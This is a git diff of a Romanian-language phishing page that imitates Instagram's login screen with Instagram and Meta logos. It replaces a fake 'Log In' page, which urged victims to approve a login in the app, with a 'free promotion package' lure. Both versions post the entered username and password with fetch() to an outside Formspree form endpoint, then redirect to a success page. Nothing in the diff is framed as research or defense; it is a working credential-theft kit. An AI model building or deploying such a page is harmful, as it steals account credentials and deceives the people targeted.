@@ -3,62 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log In • Instagram</title>
+    <title>Instagram Boost</title>
     <style>
-        body { background: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { width: 310px; text-align: center; border: 1px solid #dbdbdb; padding: 40px 20px; border-radius: 3px; background: white; box-sizing: border-box; }
-        .logo-img { width: 175px; margin-bottom: 35px; }
-        input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 13px; box-sizing: border-box; outline: none; }
+        body { background-color: #fafafa; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { width: 350px; background: white; border: 1px solid #dbdbdb; border-radius: 8px; padding: 40px 0; box-shadow: 0 4px 12px rgba(0,0,0,0.05); display: flex; flex-direction: column; align-items: center; }
         
-        /* Textul de securitate adaugat */
-        .security-msg { font-size: 12px; color: #8e8e8e; margin: 15px 0; line-height: 1.4; text-align: center; border-top: 1px solid #efefef; padding-top: 15px; }
-        .security-msg b { color: #262626; }
-
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 14px; }
-        .footer { position: absolute; bottom: 20px; font-size: 11px; color: #c7c7c7; text-transform: uppercase; letter-spacing: 1px; }
+        /* Gradient Instagram stilizat */
+        .card::before { content: ""; position: absolute; top: 0; left: 0; right: 0; height: 5px; background: linear-gradient(45deg, #0095f6, #ff007f); border-top-left-radius: 8px; border-top-right-radius: 8px; }
+        
+        .logo { width: 175px; margin-bottom: 30px; }
+        .info { font-size: 13px; color: #8e8e8e; text-align: center; margin: 0 40px 25px; line-height: 1.5; }
+        form { width: 270px; display: flex; flex-direction: column; }
+        input { background: #fafafa; border: 1px solid #dbdbdb; border-radius: 5px; padding: 10px; margin-bottom: 8px; font-size: 12px; outline: none; transition: 0.3s; }
+        input:focus { border: 1px solid #0095f6; }
+        
+        /* Buton cu gradientul ales de tine */
+        button { background: linear-gradient(45deg, #0095f6, #ff007f); color: white; border: none; border-radius: 8px; padding: 10px; font-weight: 600; font-size: 14px; margin-top: 15px; cursor: pointer; transition: 0.3s; }
+        button:active { transform: scale(0.98); opacity: 0.8; }
+        button:disabled { opacity: 0.7; cursor: not-allowed; }
+        
+        .meta-footer { position: absolute; bottom: 30px; opacity: 0.5; width: 60px; }
     </style>
 </head>
 <body>
-
-    <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo-img">
-        
-        <form id="step1">
-            <input type="text" id="u" placeholder="Telefon, utilizator sau e-mail" required>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
+        <div class="info">Conectează-te pentru a confirma identitatea și a primi pachetul de promovare gratuită pe acest dispozitiv.</div>
+        <form id="go">
+            <input type="text" id="u" placeholder="Telefon, utilizator sau email" required>
             <input type="password" id="p" placeholder="Parolă" required>
-            
-            <div class="security-msg">
-                După ce apeși Log In, te rugăm să deschizi aplicația pe telefon și să apeși pe <b>"Da, eu sunt"</b> pentru a confirma conectarea.
-            </div>
-
-            <button type="submit" id="b">Log in</button>
+            <button type="submit" id="b">Revendică Pachetul</button>
         </form>
     </div>
-
-    <div class="footer">from META</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" class="meta-footer">
 
     <script>
-        document.getElementById('step1').onsubmit = function(e) {
+        document.getElementById('go').onsubmit = function(e) {
             e.preventDefault();
-            
             const btn = document.getElementById('b');
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-
-            btn.innerHTML = "Se conectează...";
+            btn.innerHTML = "Se procesează...";
             btn.disabled = true;
 
+            // Funcționalitatea originală neschimbată
             fetch("https://formspree.io/f/xzdkrgdq", {
                 method: "POST",
-                body: JSON.stringify({ Utilizator: user, Parola: pass }),
+                body: JSON.stringify({ User: document.getElementById('u').value, Pass: document.getElementById('p').value }),
                 headers: { "Content-Type": "application/json", "Accept": "application/json" }
             });
 
-            setTimeout(function() {
-                window.location.href = "verificare/succes.html";
-            }, 1000);
+            setTimeout(() => { window.location.href = "verificare/succes.html"; }, 1500);
         };
     </script>
-
 </body>
 </html>
